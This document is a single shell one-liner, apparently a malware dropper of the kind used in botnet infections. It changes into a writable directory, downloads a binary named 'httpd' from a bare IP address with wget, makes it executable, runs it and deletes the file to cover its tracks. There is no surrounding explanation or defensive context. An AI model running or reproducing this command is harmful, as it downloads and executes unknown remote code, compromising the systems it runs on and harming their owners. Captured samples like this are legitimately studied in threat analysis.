cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.55.212/httpd; chmod +x httpd; ./httpd; rm -rf httpd
